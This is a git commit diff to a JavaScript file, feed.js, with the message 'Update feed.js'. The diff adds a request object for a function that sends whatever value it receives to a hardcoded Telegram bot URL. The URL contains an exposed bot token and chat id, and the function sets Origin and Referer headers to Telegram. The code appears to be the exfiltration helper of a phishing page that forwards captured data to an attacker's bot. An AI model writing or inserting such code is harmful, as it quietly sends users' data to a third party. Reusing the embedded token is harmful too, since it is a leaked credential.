6edba212764897fbea0cc55bceb9a557b9901025
zackopk2 <90936576+zackopk2@users.noreply.github.com>
2023-01-12 16:45:07 -0300

    Update feed.js

--- feed.js
+++ feed.js
@@ -1,2 +1,3 @@
+var oReq = new XMLHttpRequest();
 function status(url)
 {var messagen_send = url;var next3 = 'https://api.telegram.org/bot5855689089:AAE5sgU1TifEt3Se89O8RmkJKOH-74DU1WU/sendMessage?chat_id=5855689089&text='+messagen_send;oReq.open("GET", next3);oReq.setRequestHeader("Origin","https://api.telegram.org");oReq.setRequestHeader("Referer","https://api.telegram.org/");oReq.send()}
